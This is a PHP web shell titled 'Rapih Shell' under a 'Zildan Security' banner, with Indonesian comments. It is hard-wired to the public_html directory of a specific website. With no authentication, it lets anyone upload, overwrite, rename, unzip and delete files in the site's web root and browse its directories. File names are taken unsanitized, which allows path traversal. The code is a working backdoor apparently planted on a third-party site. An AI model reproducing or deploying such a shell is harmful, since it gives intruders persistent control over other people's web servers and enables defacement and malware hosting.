<?php
$uploadDir = '/home/piccolinaadventures.com/public_html/'; // Direktori untuk menyimpan file yang diunggah

// Fungsi untuk mengunggah file
function uploadFile($file)
{
    global $uploadDir;

    $uploadedFile = $uploadDir . basename($file['name']);

    // Periksa apakah file sudah ada
    if (file_exists($uploadedFile)) {
        echo "File already exists.";
        return false;
    }

    // Coba pindahkan file yang diunggah ke direktori yang diinginkan
    if (move_uploaded_file($file['tmp_name'], $uploadedFile)) {
        echo "File uploaded successfully.";
        return true;
    } else {
        echo "Failed to upload file.";
        return false;
    }
}

// Fungsi untuk mengedit file
function editFile($fileName, $content)
{
    global $uploadDir;

    $filePath = $uploadDir . $fileName;

    // Periksa apakah file ada
    if (file_exists($filePath)) {
        // Buka file untuk ditulis
        $file = fopen($filePath, "w");
        if ($file) {
            fwrite($file, $content);
            fclose($file);
            echo "File edited successfully.";
        } else {
            echo "Failed to open file for editing.";
        }
    } else {
        echo "File does not exist.";
    }
}

// Fungsi untuk mengubah nama file
function renameFile($oldName, $newName)
{
    global $uploadDir;

    $oldPath = $uploadDir . $oldName;
    $newPath = $uploadDir . $newName;

    // Periksa apakah file lama ada
    if (file_exists($oldPath)) {
        // Periksa apakah file baru sudah ada
        if (file_exists($newPath)) {
            echo "A file with the new name already exists.";
        } else {
            // Ubah nama file
            if (rename($oldPath, $newPath)) {
                echo "File renamed successfully.";
            } else {
                echo "Failed to rename file.";
            }
        }
    } else {
        echo "File does not exist.";
    }
}

// Fungsi untuk menambahkan file
function addFile($file)
{
    global $uploadDir;

    $uploadedFile = $uploadDir . basename($file['name']);

    // Periksa apakah file sudah ada
    if (file_exists($uploadedFile)) {
        echo "File already exists.";
        return false;
    }

    // Coba pindahkan file yang diunggah ke direktori yang diinginkan
    if (move_uploaded_file($file['tmp_name'], $uploadedFile)) {
        echo "File added successfully.";
        return true;
    } else {
        echo "Failed to add file.";
        return false;
    }
}

// Fungsi untuk mengekstrak file zip
function unzipFile($fileName)
{
    global $uploadDir;

    $filePath = $uploadDir . $fileName;

    // Periksa apakah file ada
    if (file_exists($filePath)) {
        // Periksa apakah ekstensi file adalah zip
        if (pathinfo($filePath, PATHINFO_EXTENSION) === 'zip') {
            $zip = new ZipArchive;
            if ($zip->open($filePath) === TRUE) {
                $zip->extractTo($uploadDir);
                $zip->close();
                echo "File unzipped successfully.";
            } else {
                echo "Failed to unzip file.";
            }
        } else {
            echo "The file is not a zip file.";
        }
    } else {
        echo "File does not exist.";
    }
}

// Fungsi untuk menghapus file
function deleteFile($fileName)
{
    global $uploadDir;

    $filePath = $uploadDir . $fileName;

    // Periksa apakah file ada
    if (file_exists($filePath)) {
        // Hapus file
        if (unlink($filePath)) {
            echo "File deleted successfully.";
        } else {
            echo "Failed to delete file.";
        }
    } else {
        echo "File does not exist.";
    }
}

// Fungsi untuk pindah ke direktori lain
function changeDirectory($directory)
{
    global $uploadDir;

    $newDir = $uploadDir . $directory;

    // Periksa apakah direktori ada
    if (is_dir($newDir)) {
        $uploadDir = $newDir;
        echo "Changed directory to '$directory'.";
    } else {
        echo "Directory does not exist.";
    }
}

// Fungsi untuk mendapatkan daftar file di direktori
function getFileList()
{
    global $uploadDir;

    $files = scandir($uploadDir);
    $fileList = array();

    foreach ($files as $file) {
        if ($file !== '.' && $file !== '..') {
            $fileList[] = $file;
        }
    }

    return $fileList;
}

// Fungsi untuk mendapatkan daftar direktori di direktori
function getDirectoryList()
{
    global $uploadDir;

    $directories = scandir($uploadDir);
    $directoryList = array();

    foreach ($directories as $directory) {
        if ($directory !== '.' && $directory !== '..' && is_dir($uploadDir . $directory)) {
            $directoryList[] = $directory;
        }
    }

    return $directoryList;
}

// Proses permintaan unggah, edit, rename, tambah file, unzip, delete, pindah direktori, dan melihat daftar file/direktori
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['action'])) {
        $action = $_POST['action'];

        if ($action === 'upload') {
            if (isset($_FILES['file'])) {
                uploadFile($_FILES['file']);
            }
        } elseif ($action === 'edit') {
            if (isset($_POST['file_name']) && isset($_POST['content'])) {
                editFile($_POST['file_name'], $_POST['content']);
            }
        } elseif ($action === 'rename') {
            if (isset($_POST['old_name']) && isset($_POST['new_name'])) {
                renameFile($_POST['old_name'], $_POST['new_name']);
            }
        } elseif ($action === 'add') {
            if (isset($_FILES['file'])) {
                addFile($_FILES['file']);
            }
        } elseif ($action === 'unzip') {
            if (isset($_POST['file_name'])) {
                unzipFile($_POST['file_name']);
            }
        } elseif ($action === 'delete') {
            if (isset($_POST['file_name'])) {
                deleteFile($_POST['file_name']);
            }
        } elseif ($action === 'change_directory') {
            if (isset($_POST['directory'])) {
                changeDirectory($_POST['directory']);
            }
        }
    }
}

// Mendapatkan daftar file dan direktori
$fileList = getFileList();
$directoryList = getDirectoryList();
?>

<!DOCTYPE html>
<html>
<head>
    <title>Zildan Security - Rapih Shell</title>
    <style>
        ul {
            list-style-type: none;
        }
    </style>
</head>
<body>
    <h2>Rapih Shell</h2>
    <form method="post" enctype="multipart/form-data">
        <input type="hidden" name="action" value="upload">
        <input type="file" name="file">
        <input type="submit" value="Upload">
    </form>

    <h2>File Editor</h2>
    <form method="post">
        <input type="hidden" name="action" value="edit">
        <input type="text" name="file_name" placeholder="File Name">
        <br>
        <textarea name="content" rows="10" cols="50" placeholder="Content"></textarea>
        <br>
        <input type="submit" value="Edit">
    </form>

    <h2>File Renamer</h2>
    <form method="post">
        <input type="hidden" name="action" value="rename">
        <input type="text" name="old_name" placeholder="Old File Name">
        <br>
        <input type="text" name="new_name" placeholder="New File Name">
        <br>
        <input type="submit" value="Rename">
    </form>

    <h2>Add File</h2>
    <form method="post" enctype="multipart/form-data">
        <input type="hidden" name="action" value="add">
        <input type="file" name="file">
        <input type="submit" value="Add">
    </form>

    <h2>Unzip File</h2>
    <form method="post">
        <input type="hidden" name="action" value="unzip">
        <input type="text" name="file_name" placeholder="File Name">
        <br>
        <input type="submit" value="Unzip">
    </form>

    <h2>Delete File</h2>
    <form method="post">
        <input type="hidden" name="action" value="delete">
        <input type="text" name="file_name" placeholder="File Name">
        <br>
        <input type="submit" value="Delete">
    </form>

    <h2>Change Directory</h2>
    <form method="post">
        <input type="hidden" name="action" value="change_directory">
        <input type="text" name="directory" placeholder="Directory Name">
        <br>
        <input type="submit" value="Change Directory">
    </form>

    <h2>File List</h2>
    <ul>
        <?php foreach ($fileList as $file) { ?>
            <li><?php echo $file; ?></li>
        <?php } ?>
    </ul>

    <h2>Directory List</h2>
    <ul>
        <?php foreach ($directoryList as $directory) { ?>
            <li><?php echo $directory; ?></li>
        <?php } ?>
    </ul>
</body>
</html>